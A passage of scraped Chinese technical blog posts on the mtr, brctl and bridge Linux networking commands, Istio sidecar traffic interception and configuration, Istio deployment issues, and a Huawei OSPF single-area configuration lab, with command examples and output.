traceroute 和 ping 的功能结合到一个工具。与 traceroute 不同的是 mtr 显示的信息比起 traceroute 更加丰富：通过 mtr 可以确定网络的条数，并且可以同时打印响应百分比以及网络中各跳跃点的响应时间。\n各系统下的安装\nUbuntu/Debian: mtr ；apt-get install -y mtr CentOS/Fedora: mtr ；yum install -y mtr Apline：mtr ；apk add mtr --no-cache 简单的使用示例 最简单的示例，就是后接域名或IP，这将跟踪整个路由\n$ mtr google.com Start: Thu Jun 28 12:10:13 2018 HOST: TecMint Loss% Snt Last Avg Best Wrst StDev 1.|-- 192.168.0.1 0.0% 5 0.3 0.3 0.3 0.4 0.0 2.|-- 5.5.5.211 0.0% 5 0.7 0.9 0.7 1.3 0.0 3.|-- 209.snat-111-91-120.hns.n 80.0% 5 7.1 7.1 7.1 7.1 0.0 4.|-- 72.14.194.226 0.0% 5 1.9 2.9 1.9 4.4 1.1 5.|-- 108.170.248.161 0.0% 5 2.9 3.5 2.0 4.3 0.7 6.|-- 216.239.62.237 0.0% 5 3.0 6.2 2.9 18.3 6.7 7.|-- bom05s12-in-f14.1e100.net 0.0% 5 2.1 2.4 2.0 3.8 0.5 -n 强制 mtr 打印 IP地址而不是主机名\n$ mtr -n google.com Start: Thu Jun 28 12:12:58 2018 HOST: TecMint Loss% Snt Last Avg Best Wrst StDev 1.|-- 192.168.0.1 0.0% 5 0.3 0.3 0.3 0.4 0.0 2.|-- 5.5.5.211 0.0% 5 0.9 0.9 0.8 1.1 0.0 3.|-- ??? 100.0 5 0.0 0.0 0.0 0.0 0.0 4.|-- 72.14.194.226 0.0% 5 2.0 2.0 1.9 2.0 0.0 5.|-- 108.170.248.161 0.0% 5 2.3 2.3 2.2 2.4 0.0 6.|-- 216.239.62.237 0.0% 5 3.0 3.2 3.0 3.3 0.0 7.|-- 172.217.160.174 0.0% 5 3.7 3.6 2.0 5.3 1.4 -b 同时显示IP地址与主机名\n$ mtr -b google.com Start: Thu Jun 28 12:14:36 2018 HOST: TecMint Loss% Snt Last Avg Best Wrst StDev 1.|-- 192.168.0.1 0.0% 5 0.3 0.3 0.3 0.4 0.0 2.|-- 5.5.5.211 0.0% 5 0.7 0.8 0.6 1.0 0.0 3.|-- 209.snat-111-91-120.hns.n 0.0% 5 1.4 1.6 1.3 2.1 0.0 4.|-- 72.14.194.226 0.0% 5 1.8 2.1 1.8 2.6 0.0 5.|-- 108.170.248.209 0.0% 5 2.0 1.9 1.8 2.0 0.0 6.|-- 216.239.56.115 0.0% 5 2.4 2.7 2.4 2.9 0.0 7.|-- bom07s15-in-f14.1e100.net 0.0% 5 3.7 2.2 1.7 3.7 0.9 -c 跟一个具体的值，这将限制 mtr ping的次数，到达次数后会退出\n$ mtr -c5 google.com 如果需要指定次数，并且在退出后保存这些数据，使用 -r flag\n$ mtr -r -c 5 google.com \u0026gt; 1 $ cat 1 Start: Sun Aug 21 22:06:49 2022 HOST: xxxxx.xxxxx.xxxx.xxxx Loss% Snt Last Avg Best Wrst StDev 1.|-- gateway 0.0% 5 0.6 146.8 0.6 420.2 191.4 2.|-- 212.xx.21.241 0.0% 5 0.4 1.0 0.4 2.3 0.5 3.|-- 188.xxx.106.124 0.0% 5 0.7 1.1 0.7 2.1 0.5 4.|-- ??? 100.0 5 0.0 0.0 0.0 0.0 0.0 5.|-- 72.14.209.89 0.0% 5 43.2 43.3 43.1 43.3 0.0 6.|-- 108.xxx.250.33 0.0% 5 43.2 43.1 43.1 43.2 0.0 7.|-- 108.xxx.250.34 0.0% 5 43.7 43.6 43.5 43.7 0.0 8.|-- 142.xxx.238.82 0.0% 5 60.6 60.9 60.6 61.2 0.0 9.|-- 142.xxx.238.64 0.0% 5 59.7 67.5 59.3 89.8 13.2 10.|-- 142.xxx.37.81 0.0% 5 62.7 62.9 62.6 63.5 0.0 11.|-- 142.xxx.229.85 0.0% 5 61.0 60.9 60.7 61.3 0.0 12.|-- xx-in-f14.1e100.net 0.0% 5 59.0 58.9 58.9 59.0 0.0 默认使用的是 ICMP 协议 -i ，可以指定 -u, -t 使用其他协议\nmtr --tcp google.com -m 指定最大的跳数\nmtr -m 35 216.58.223.78 -s 指定包的大小\nmtr输出的数据 colum describe last 最近一次的探测延迟值 avg 探测延迟的平均值 best 探测延迟的最小值 wrst 探测延迟的最大值 stdev 标准偏差。越大说明相应节点越不稳定 丢包判断 任一节点的 Loss%（丢包率）如果不为零，则说明这一跳网络可能存在问题。导致相应节点丢包的原因通常有两种。\n运营商基于安全或性能需求，人为限制了节点的ICMP发送速率，导致丢包。 节点确实存在异常，导致丢包。可以结合异常节点及其后续节点的丢包情况，来判定丢包原因。 Notes:\n如果随后节点均没有丢包，则通常说明异常节点丢包是由于运营商策略限制所致。可以忽略相关丢包。 如果随后节点也出现丢包，则通常说明节点确实存在网络异常，导致丢包。对于这种情况，如果异常节点及其后续节点连续出现丢包，而且各节点的丢包率不同，则通常以最后几跳的丢包率为准。如链路测试在第5, 6, 7跳均出现了丢包。最终丢包情况以第7跳作为参考。 延迟判断 由于链路抖动或其它因素的影响，节点的 Best 和 Worst 值可能相差很大。而 Avg（平均值）统计了自链路测试以来所有探测的平均值，所以能更好的反应出相应节点的网络质量。而 StDev（标准偏差值）越高，则说明数据包在相应节点的延时值越不相同（越离散）。所以标准偏差值可用于协助判断 Avg 是否真实反应了相应节点的网络质量。例如，如果标准偏差很大，说明数据包的延迟是不确定的。可能某些数据包延迟很小（例如：25ms），而另一些延迟却很大（例如：350ms），但最终得到的平均延迟反而可能是正常的。所以此时 Avg 并不能很好的反应出实际的网络质量情况。\n这就需要结合如下情况进行判断：\n如果 StDev 很高，则同步观察相应节点的 Best 和 wrst，来判断相应节点是否存在异常。 如果StDev 不高，则通过Avg来判断相应节点是否存在异常。 brctl [5] brctl 是用于创建和操作 Linux Bridge 的命令行工具，\n各系统下的安装\nUbuntu/Debian: bridge-utils ；apt-get install -y bridge-utils CentOS/Fedora: bridge-utils ；yum install -y bridge-utils Apline：bridge-utils ；apk add bridge-utils --no-cache 显示所有启用的网桥的设备 使用 brctl show 查看当前节点可用的 bridge\n$ brctl show bridge name bridge id STP enabled interfaces br0 8000.000d3a8a7868 no eth1 vnet0 virbr0 8000.5254005098ae yes virbr0-nic 创建网桥 使用 brctl addbr \u0026lt;name\u0026gt; 可以创建出一个Linux Bridge\nbrctl addbr dev 在网桥上添加接口 使用 brctl addif \u0026lt;bridge_name\u0026gt; \u0026lt;interface_name\u0026gt; 可以在一个已经存在的 bridge 上添加一个接口\n$ brctl addif br0 eth1 指定多个 \u0026lt;interface_name\u0026gt; 会向网桥上添加多个接口\n$ brctl addif br0 enp0s3 enp1s3 删除网桥 使用 brctl delbr \u0026lt;bridge_name\u0026gt; 可以删除一个网桥\n$ brctl delbr br0 检查网桥 STF 信息 使用 brctl showstp \u0026lt;bridge_name\u0026gt; 可以查看网桥的STF信息\n$ brctl showstp br0 br0 bridge id 8000.000000000000 designated root 8000.000000000000 root port 0 path cost 0 max age 20.00 bridge max age 20.00 hello time 2.00 bridge hello time 2.00 forward delay 15.00 bridge forward delay 15.00 ageing time 300.00 hello timer 0.00 tcn timer 0.00 topology change timer 0.00 gc timer 0.00 flags 从网桥上删除接口 使用 brctl delif \u0026lt;bridge_name\u0026gt; \u0026lt;interface_name\u0026gt; 可以从网桥上删除接口。\n$ brctl delif br0 enp0s3 开启/关闭生成树协议 使用 brctl stp \u0026lt;bridge_name\u0026gt; on/off 可以选择开启或关闭生成树协议\n$ brctl stp br0 off $ brctl stp br0 on 查看网桥上学到的MAC地址 使用 brctl showmacs \u0026lt;bridge_name\u0026gt; 可以查看网桥上学到的所有设备的MAC地址。\n$ brctl showmacs br0 port no mac addr is local? ageing timer 1 00:74:16:87:14:de yes 0.00 修改STP值 如果需要修改 STP 参数值，可以通过 brctl setageing \u0026lt;bridge_name\u0026gt; \u0026lt;value\u0026gt; 来修改\n$ brctl setageing br0 100 bridge [6] bridge 是一款用于展示和操作网桥地址和设备的命令，通常情况下\n各系统下的包名与安装\nUbuntu/Debian: iproute2 ；apt install iproute2 CentOS/Fedora: iproute2 ；yum install -y iproute2 Apline：iproute2 ；apk add iproute2 bridge 命令可以完成三种类型的配置管理：\n端口配置 FDB管理 VLAN 配置 大多数人都会使用 brctl 命令替代，而 bridge 通常只是来完成 FDB (forwarding database management ) 的相关操作。。也可以使用 bridge 命令创建和删除VLAN。\nbridge vs brct [7] BRIDGE MANAGEMENT 动作 BRCTL BRIDGE 创建bridge brctl addbr \u0026lt;bridge\u0026gt; 删除bridge brctl delbr \u0026lt;bridge\u0026gt; 为bridge添加接口 brctl addif \u0026lt;bridge\u0026gt; \u0026lt;ifname\u0026gt; 删除bridge上的接口 brctl delbr \u0026lt;bridge\u0026gt; FDB MANAGEMENT ACTION BRCTL BRIDGE 显示 FDB 中的 MAC 列表 brctl showmacs \u0026lt;bridge\u0026gt; bridge fdb show 设置 FDB 条目老化时间 brctl setageingtime \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt; 设置 FDB 垃圾回收间隔 brctl setgcint \u0026lt;brname\u0026gt; \u0026lt;time\u0026gt; 添加FDB 条目(add) bridge fdb add dev \u0026lt;interface\u0026gt; [dst, vni, port, via] 追加FDB条目(append) bridge fdb append (parameters same as for fdb add) 删除 FDB 条目 bridge fdb delete (parameters same as for fdb add) STP MANAGEMENT ACTION BRCTL BRIDGE 打开/关闭 STP brctl stp \u0026lt;bridge\u0026gt; \u0026lt;state\u0026gt; 设置网桥优先级 brctl setbridgeprio \u0026lt;bridge\u0026gt; \u0026lt;priority\u0026gt; 设置网桥转发延迟 brctl setfd \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt; 设置bridge “hello”时间 brctl sethello \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt; 设置网桥最大消息年龄 brctl setmaxage \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt; 设置桥上端口开销 brctl setpathcost \u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; \u0026lt;cost\u0026gt; bridge link set dev \u0026lt;port\u0026gt; cost \u0026lt;cost\u0026gt; 设置网桥端口优先级 brctl setportprio \u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; \u0026lt;priority\u0026gt; bridge link set dev \u0026lt;port\u0026gt; priority \u0026lt;priority\u0026gt; 是否应端口处理 STP BDPU bridge link set dev \u0026lt;port \u0026gt; guard [on, off] 网桥是否应该在接收到的端口上发送流量 bridge link set dev \u0026lt;port\u0026gt; hairpin [on,off] 在端口上启用/禁用 fastleave 选项 bridge link set dev \u0026lt;port\u0026gt; fastleave [on,off] 设置 STP 端口状态 bridge link set dev \u0026lt;port\u0026gt; state \u0026lt;state\u0026gt; VLAN MANAGEMENT ACTION BRCTL BRIDGE 创建新的 VLAN 过滤器条目 bridge vlan add dev [vid, pvid, untagged, self, master] 删除 VLAN 过滤器条目 bridge vlan delete dev (parameters same as for vlan add) 列出 VLAN 配置 bridge vlan show Reference [1] tcpdump\n[2] linux mtr command\n[3] man nsenter\n[4] How to install nsenter\n[5] examples for ethernet network bridge\n[6] man bridge\n[7] comparison of brctl and bridge\n","permalink":"https://www.oomkill.com/2021/01/linux-network-command/","summary":"","title":"长期总结 - Linux网络命令合集"},{"content":"sidecar 介绍 在istio的流量管理等功能，都需要通过下发的配置应用到应用运行环境执行后生效，负责执行配置规则的组件在service mesh中承载应用代理的实体被称为side-car\nIstio对流量策略管理等功能无须对应用程序做变动，\n这种对应用服务完全非侵入的方式完全依赖于Side-car，应用的流量有Sidecar拦截并进行认证、鉴权、策略执行等治理功能。在Kubernetes平台中，Side-car容器于应用容器在同一个Pod中并共享网络名词控件，因此Side-car容易可以通过iptables规则拦截进出流量进行管理。\nsidecar的注入 sidecar是service mesh无侵入式架构的应用模式，在使用sidecar部署服务网格时，无需再每个应用节点运行服务代理，但是需要在每个应用程序中部署一个sidecar容器，来接管所有进出流量。\nSidecar会将额外容器注入到 Pod 模板中。Istio中的数据平面组件所需的容器有：\nistio-init 用于设置容器的iptables规则，目的是为了接管进出流量。在应用容器前启动并运行完成其生命周期，多个init容器按顺序依次完成。 istio-proxy 基于envoy的sidecar的代理。 sidecar被注入的方式 手动注入，使用 istioctl 修改容器模板并添加前面提到的两个容器的配置。不论是手动注入还是自动注入，Istio 都从 istio-sidecar-injector 和的 istio 两个 Configmap 对象中获取配置。 refer-istio-sidecar-injector\n自动注入，在部署应用是，istio自动将sidecar注入到pod。这是istio推荐的方法，Istio在基于Kubernetes平台之上，需要在部署应用之前，对要标记部署应用程序的名称空间标记 kubectl label namespace default istio-injection=enabled 这个操作是对名称空间级别生效的。而后所部署的Pod中会注入sidecar执行上面sidecar容器的操作。\nistio injector 注入原理 Sidecar Injector是Istio中实现自动注入Sidecar的组件，它是以Kubernetes准入控制器 AdmissionController 的形式运行的。Admission Controller 的基本工作原理是拦截Kube-apiserver的请求，在对象持久化之前、认证鉴权之后进行拦截。\nAdmission Controller有两种：一种是内置的，另一种是用户自定义的。\nKubernetes允许用户以Webhook的方式自定义准入控制器，Sidecar Injector就是这样一种特殊的MutatingAdmissionWebhook。\nSidecar Injector只在创建Pod时进行Sidecar容器注入，在Pod的创建请求到达 Kube-apiserver 后，首先进行认证鉴权，然后在准入控制阶段，Kube-apiserver以REST的方式同步调用Sidecar Injector Webhook服务进行init与istio-proxy容器的注入，最后将Pod对象持久化存储到etcd中。\nsidecar容器 sidecar容器内部运行着 pilot-agent 与 envoy\nPilot-agent：基于kubernetesAPI资源对象为envoy初始化可用的bootstrap配置进行启动，在运行后管理envoy运行状态，如配置变更，出错重启等。\nenvoy：数据平面的执行层，由 pilot-agent 所启动的，从xDS API动态获取配置信息。Envoy并通过流量拦截机制处理入栈及出栈的流量。\nenvoy的listener 在运行在Kubernetes平台之上的istio，Envoy是通过Pilot将Kubernetes CRD资源 DestnationRule VirtualService Gateway等资源提供的配置，生成对应的Envoy配置。\n每个sidecar中的envoy都会生成众多的配置，这些配置在每一个网格中会对对应的流量进行拦截管理。\n通过envoy admin interface查看对应生产的envoy资源配置信息\n$ kubectl exec reviews-v1-6549ddccc5-k995p -c istio-proxy -- curl -s 127.0.0.1:15000/listeners 97591f7a-0cbf-469a-a5f2-c9a76a3d0ced::0.0.0.0:15090 e523c9a4-da71-439f-885f-020f70349f21::0.0.0.0:15021 10.96.56.243_10251::10.96.56.243:10251 10.0.0.6_10250::10.0.0.6:10250 10.244.0.51_8443::10.244.0.51:8443 10.0.0.5_10250::10.0.0.5:10250 10.97.190.96_10252::10.97.190.96:10252 10.96.0.1_443::10.96.0.1:443 10.96.0.10_53::10.96.0.10:53 10.105.226.65_80::10.105.226.65:80 10.105.226.65_82::10.105.226.65:82 0.0.0.0_80::0.0.0.0:80 10.0.0.6_4194::10.0.0.6:4194 10.105.226.65_443::10.105.226.65:443 10.105.226.65_81::10.105.226.65:81 10.0.0.5_4194::10.0.0.5:4194 10.102.134.81_14250::10.102.134.81:14250 10.107.39.113_9090::10.107.39.113:9090 0.0.0.0_10255::0.0.0.0:10255 0.0.0.0_20001::0.0.0.0:20001 0.0.0.0_9090::0.0.0.0:9090 10.96.0.10_9153::10.96.0.10:9153 10.102.134.81_14268::10.102.134.81:14268 0.0.0.0_9411::0.0.0.0:9411 10.101.93.145_8000::10.101.93.145:8000 10.99.79.173_443::10.99.79.173:443 10.105.226.65_8080::10.105.226.65:8080 0.0.0.0_9080::0.0.0.0:9080 10.108.161.174_3000::10.108.161.174:3000 virtualOutbound::0.0.0.0:15001 virtualInbound::0.0.0.0:15006 .. istio使用的端口\nPort Protocol Description Pod-internal only 15000 TCP envoy管理端口 Yes 15001 TCP envoy出站端口 No 15006 TCP envoy入站端口 No 15008 TCP envoy隧道端口 No 15020 HTTP 从istio-agent envoy 应用 合并prometheus遥测 No 15021 HTTP 健康检查端口 No 15090 HTTP Envoy Prometheus telemetry No envoy的listener通过绑定与IP Socket或者Unix Domain Socket，接收转发来的数据。\nVirtualOutboundListener | VirtualIntboundListener 通过一个端口接收所有出/入站流量，并根据目标端口来区分使用哪个Listener进行处理。\niptables通过对应规则拦截发往所在Pod的流量并转发到对应的Envoy接收端口（如入站流量为15006），该Listener通过配置将请求转发到请求原目标地址关联的Listener之上。envoy原始目标地址\n若不存在对应的listener则根据全局配置选项进行处理\nALLOW_ANY：允许外发至任何服务的请求，没有匹配到目标Listener的流量则由tcp_proxy过滤器指向的PassthroughCluster。 REGISTRY_ONLY：仅允许外发请求至注册过的服务，没有匹配到目标Listener的流量，则由tcp_proxy通过BlackHoleCluster丢弃。 监听端口配置参数bind_to_port的值为false，意味着该Listener并未真正绑定套接字上，而是通过对应的入站/出站Linstener接收兵转发流量。\nsidecar 流量的拦截 sidecar通过注入到Pod中的init，执行在 pod 命名空间中设置 iptable 规则来完成流量捕获并管理。\n通过查看nsenter 命令可以查看对应实现的内容。\niptables在NAT表中新建了4条链，ISTIO_INBOUND、ISTIO_IN_REDIRECT、ISTIO_OUTPUT 和 ISTIO_REDIRECT\n当进入Pod的流量会被PREROUTING 拦截处理。根据规则将数据包转发到ISOTIO_INBOUND。-A PREROUTING -p tcp -j ISTIO_INBOUND ISTIO_INBOUND处理对应的规则，当遇到15008 , 22 15090 15021 15020 不做处理，return给上一个链。 关于iptables return 剩余流量从ISTIO_INBOUND 转交给 ISTIO_IN_REDIRECT -A ISTIO_INBOUND -p tcp -j ISTIO_IN_REDIRECT ISTIO_IN_REDIRECT 将流量交给15006端口应用处理。 Envoy根据数据包的目的地址查看 Inbound方向的监听器配置，根据监听器及路由、Cluster、 Endpoint等配置，决定是否将数据包转发到应用。 OUTPUT的流量由规则 -A OUTPUT -p tcp -j ISTIO_OUTPUT 由 ISTIO_OUTPUT ` 链处理。 $ nsenter -t `ps -ef|grep details|grep envoy|awk '{print $2}'` -n iptables -t nat -S -P PREROUTING ACCEPT -P INPUT ACCEPT -P OUTPUT ACCEPT -P POSTROUTING ACCEPT -N ISTIO_INBOUND -N ISTIO_IN_REDIRECT -N ISTIO_OUTPUT -N ISTIO_REDIRECT -A PREROUTING -p tcp -j ISTIO_INBOUND -A OUTPUT -p tcp -j ISTIO_OUTPUT -A ISTIO_INBOUND -p tcp -m tcp --dport 15008 -j RETURN -A ISTIO_INBOUND -p tcp -m tcp --dport 22 -j RETURN -A ISTIO_INBOUND -p tcp -m tcp --dport 15090 -j RETURN -A ISTIO_INBOUND -p tcp -m tcp --dport 15021 -j RETURN -A ISTIO_INBOUND -p tcp -m tcp --dport 15020 -j RETURN -A ISTIO_INBOUND -p tcp -j ISTIO_IN_REDIRECT # 到此入栈流量处理完成 -A ISTIO_IN_REDIRECT -p tcp -j REDIRECT --to-ports 15006 # 这里开始执行出站流量 # 原地址为127.0.0.6/32 不做处理 -A ISTIO_OUTPUT -s 127.0.0.6/32 -o lo -j RETURN # 默认目标127.0.0.1/32--uid-owner 1337的由ISTIO_IN_REDIRECT处理 -A ISTIO_OUTPUT ! -d 127.0.0.1/32 -o lo -m owner --uid-owner 1337 -j ISTIO_IN_REDIRECT -A ISTIO_OUTPUT -o lo -m owner ! --uid-owner 1337 -j RETURN -A ISTIO_OUTPUT -m owner --uid-owner 1337 -j RETURN -A ISTIO_OUTPUT ! -d 127.0.0.1/32 -o lo -m owner --gid-owner 1337 -j ISTIO_IN_REDIRECT # 这些流量都不做处理。继续默认操作 -A ISTIO_OUTPUT -o lo -m owner ! --gid-owner 1337 -j RETURN -A ISTIO_OUTPUT -m owner --gid-owner 1337 -j RETURN -A ISTIO_OUTPUT -d 127.0.0.1/32 -j RETURN # 默认所有ISTIO_OUTPUT链的流量都由ISTIO_REDIRECT -A ISTIO_OUTPUT -j ISTIO_REDIRECT # ISTIO_REDIRECT 的流量 默认有envoy进行处理转发到对应的应用 -A ISTIO_REDIRECT -p tcp -j REDIRECT --to-ports 15001 Istio中目前有两种流量拦截模式：REDIRECT模式和TPROXY模式。\nTPROXY transparent proxy 透明代理，操作的是mangle表，同时需要原始客户端socket设置 IP_TRANSPARENT选项，此模式同时保留源IP地址和目标IP地址和端口。\nREDIRECT ：端口重定向，将流量NAT至envoy，此模式会丢失源IP。\nsidecar资源配置 Sidecar这个资源清单描述了Sidecar代理的配置，从而管理他所连接的workload实例的流量。\nworkloadSelector：选择sidecar应用此配置的Pod，如省略则为该名称空间的所有workload lables: 配置pod的标签 ingress：用于指定连接workload的入站流量的sidecar配置，如省略，则从默认获取。 port：Listener关联的端口 bind：Listener绑定的IP，ingress不允许unix套接字 captureMode： 流量捕获模式，仅Listener绑定到IP时适用。 DEFAULT 环境定义默认配置 IPTABLES ：使用IPtables重定向流量 NONE 不捕获。 egress: 用于指定workload的出站流量的sidecar配置，如省略，则继承默认值 port：Listener关联的端口 bind：Listener绑定的IP或套接字 captureMode： 流量捕获模式，仅Listener绑定到IP时适用。 DEFAULT 环境定义默认配置 IPTABLES ：使用IPtables重定向流量 NONE 不捕获。 hosts：目标地址，namespace/dnsName格式显示的一台或多台服务主机 outboundTrafficPolicy：出站流量策略的配置，不指定则继承默认值。 mode： REGISTRY_ONLY：仅允许注册到pilot的服务通过。 ALLOW_ANY：没有配置的，允许流量的出站。 声明一个出站流量 下面的示例在Sidecar名为的根命名空间中声明了全局默认配置istio-config，该配置在所有命名空间中配置了sidecars，以仅允许将流量发送到同一命名空间中的其他workload以及istio-system命名空间中的服务 。\napiVersion: networking.istio.io/v1alpha3 kind: Sidecar metadata: name: default namespace: istio-config spec: egress: - hosts: - \u0026quot;./*\u0026quot; - \u0026quot;istio-system/*\u0026quot; 以下示例配置一个应用的出站与入站规则；在名称空间prod-us1中声明所有app: ratings 属于该prod-us1/ratings 带有标签的Pod 。workload在端口9080上接受入站HTTP通信。然后，将通信转发到侦听Unix套接字的附加workload实例。在出口流量，除了允许发给istio-system 名称空间任何端口任何Pod的流量，如果是9080端口，允许发送给prod-us1名称空间下的所有的服务。\napiVersion: networking.istio.io/v1alpha3 kind: Sidecar metadata: name: ratings namespace: prod-us1 spec: workloadSelector: labels: app: ratings ingress: - port: number: 9080 protocol: HTTP name: somename defaultEndpoint: unix:///var/run/someuds.sock egress: - port: number: 9080 protocol: HTTP name: egresshttp hosts: - \u0026quot;prod-us1/*\u0026quot; - hosts: - \u0026quot;istio-system/*\u0026quot; ","permalink":"https://www.oomkill.com/2021/01/istio-sidecar-mechnisim/","summary":"","title":"istio sidecar流量处理机制及配置"},{"content":"端口绑定无权限 创建Gateway，提示绑定端口无权限。\n2020-12-27T12:25:30.974288Z\twarning\tenvoy config\tgRPC config for type.googleapis.com/envoy.config.listener.v3.Listener rejected: Error adding/updating listener(s) 0.0.0.0_90: cannot bind '0.0.0.0:90': Permission denied 问题原因：容器内默认权限不能使用非特权端口（\u0026lt;1024\n导出部署清单部署失败 istioctl manifest generate \u0026gt; generated-manifest.yaml 如果尝试使用来安装和管理Istio istioctl manifest generate，请注意以下警告：\nIstio名称空间（istio-system默认情况下）必须手动创建。 istioctl install 会从Kubernetes上下文中自动检测特定于环境的设置。如需手动安装需要执行如下步骤： --set values.global.jwtPolicy=third-party-jwt --set values.global.jwtPolicy=first-party-jwt refer\ntoken\nGenerate a manifest\n","permalink":"https://www.oomkill.com/2021/01/istio-deployment-qa/","summary":"","title":"istio部署问题Q\u0026A"},{"content":"Open Shortest Path First OSPF，开放的最短路径优先协议，是IETF组织开发的一个基于链路状态的内部网关协议，它的使用不受任何厂商限制，所有人都可以使用，所以称为开放的，而最短路径优先（SPF）只是OSPF的核心思想，其使用的算法是Dijkstra算法，最短路径优先并没有太多特殊的含义，并没有任何一个路由协议是最长路径优先的，所有协议，都会选最短的。\nOSPF针对IPv4协议使用的是OSPF Version 2（RFC2328）；针对IPv6协议使用OSPF Version 3（RFC2740）\n目的：\n在OSPF出现前，网络上广泛使用RIP（Routing Information Protocol）作为内部网关协议。\n由于RIP是基于距离矢量算法的路由协议，存在着收敛慢、路由环路、可扩展性差等问题，所以逐渐被OSPF取代。\nOSPF作为基于链路状态的协议，能够解决RIP所面临的诸多问题。此外，OSPF还有以下优点：\nOSPF采用组播形式收发报文，这样可以减少对其它不运行OSPF路由器的影响。 OSPF支持无类型域间选路（CIDR）。 OSPF支持对等价路由进行负载分担。 OSPF支持报文加密。 由于OSPF具有以上优势，使得OSPF作为优秀的内部网关协议被快速接收并广泛使用。\nOSPF协议特点：\nOSPF把自治系统AS（Autonomous System）划分成逻辑意义上的一个或多个区域； OSPF通过LSA（Link State Advertisement）的形式发布路由； OSPF依靠在OSPF区域内各设备间交互OSPF报文来达到路由信息的统一； OSPF报文封装在IP报文内，可以采用单播或组播的形式发送。 OSPF工作流程 寻找邻居\nOSPF协议运行后，先寻找网络中可与自己交互链路状态信息的周边路由器，可以交互链路状态信息的路由器互为邻居\n建立邻居关系\n邻接关系可以想象为一条点到点的虚链路，他是在一些邻居路由器之间构成的。只有建立了可靠邻接关系的路由器才相互传递链路状态信息。\n链路状态信息传递\nOSPF路由器将建立描述网络链路状态的LSA Link State Advertisement，链路状态公告，建立邻接关系的OSPF路由器之间将交互LSA，最终形成包含网络完整链路状态的配置信息。\n计算路由\n获得了完整的LSBD后，OSPF区域内的每个路由器将会对该区域的网络结构有相同的认识，随后各路由器将依据LSDB的信息用SPF算法独立计算出路由。\nRouter ID OSPF Router-ID用于在OSPF domain中唯一地表示一台OSPF路由器，从OSPF网络设计的角度，我们要求全OSPF域内，禁止出现两台路由器拥有相同的Router-ID。\nOSPF Router-ID的设定可以通过手工配置的方式，或者通过协议自动选取的方式。当然，在实际网络部署中，强烈建议手工配置OSPF的Router-ID，因为这关系到协议的稳定。\n实验：单区域OSPF配置 配置两台路由器\n[Huawei]sysname R2\r[R2]interface lo0\r[R2-LoopBack0]ip add 2.2.2.2 32\r[R2-LoopBack0]dis this\r[V200R003C00]\r#\rinterface LoopBack0\rip address 2.2.2.2 255.255.255.255 #\rreturn\r[R2-LoopBack0]quit\r[R2]interface g0/0/0\r[R2-GigabitEthernet0/0/0]ip a 20.0.0.1 24\rJan 24 2021 22:01:22-08:00 R2 %%01IFNET/4/LINK_STATE(l)[0]:The line protocol IP on the interface GigabitEthernet0/0/0 has entered the UP state. [R2-GigabitEthernet0/0/0]dis this\r[V200R003C00]\r#\rinterface GigabitEthernet0/0/0\rip address 20.0.0.1 255.255.255.0 #\rreturn\r[R2]dis ip routing-table Route Flags: R - relay, D - download to fib\r------------------------------------------------------------------------------\rRouting Tables: Public\rDestinations : 8 Routes : 8 Destination/Mask Proto Pre Cost Flags NextHop Interface\r2.2.2.2/32 Direct 0 0 D 127.0.0.1 LoopBack0\r20.0.0.0/24 Direct 0 0 D 20.0.0.1 GigabitEthernet\r0/0/0\r20.0.0.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet\r0/0/0\r20.0.0.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet\r0/0/0\r127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0\r127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0\r127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0\r255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0\r整理配置\nsysname R2\rinterface lo0\rip add 2.2.2.2 32\r[R2-LoopBack0]dis this\rquit\rinterface g0/0/0\rip a 20.0.0.1 24\rdis this\rdis ip routing-table 配置ospf协议\n# 配置route-id\rospf router-id 2.2.2.2\r# 选择区域\r# OSPF实施了两层的分层：\r# 1.骨干区域（也就是area0）\r# 2.连接到骨干的区域（area1~65535）\rarea 0\r# 声明一个路由，子网掩码为反向的\rnetwork 2.2.2.2 0.0.0.0\rnetwork 10.0.0.0 0.0.0.255\r# 打印ospf对的简要信息\rdis ospf peer brief # 显示ospf路由表\rdis ospf routing\r可以看到对应的已经学习到动态的路由\n[R1]dis ip routing-table Route Flags: R - relay, D - download to fib\r------------------------------------------------------------------------------\rRouting Tables: Public\rDestinations : 9 Routes : 9 Destination/Mask Proto Pre Cost Flags NextHop Interface\r1.1.1.1/32 Direct 0 0 D 127.0.0.1 LoopBack0\r2.2.2.2/32 OSPF 10 1 D 10.0.0.2 GigabitEthernet\r0/0/0\r10.0.0.0/24 Direct 0 0 D 10.0.0.1 GigabitEthernet\r0/0/0\r10.0.0.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet\r0/0/0\r10.0.0.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet\r0/0/0\r127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0\r127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0\r127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0\r255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0\r配置完成后可以看到对应的报文与状态\n[R1-ospf-1-area-0.0.0.0]\rJan 24 2021 22:12:19-08:00 R1 %%01OSPF/4/NBR_CHANGE_E(l)[0]:Neighbor changes eve\rnt: neighbor status changed. (ProcessId=256, NeighborAddress=2.0.0.10, NeighborE\rvent=HelloReceived, NeighborPreviousState=Down, NeighborCurrentState=Init) [R1-ospf-1-area-0.0.0.0]\rJan 24 2021 22:12:19-08:00 R1 %%01OSPF/4/NBR_CHANGE_E(l)[1]:Neighbor changes eve\rnt: neighbor status changed. (ProcessId=256, NeighborAddress=2.0.0.10, NeighborE\rvent=2WayReceived, NeighborPreviousState=Init, NeighborCurrentState=ExStart) [R1-ospf-1-area-0.0.0.0]\rJan 24 2021 22:12:19-08:00 R1 %%01OSPF/4/NBR_CHANGE_E(l)[2]:Neighbor changes eve\rnt: neighbor status changed. (ProcessId=256, NeighborAddress=2.0.0.10, NeighborE\rvent=NegotiationDone, NeighborPreviousState=ExStart, NeighborCurrentState=Exchan\rge) 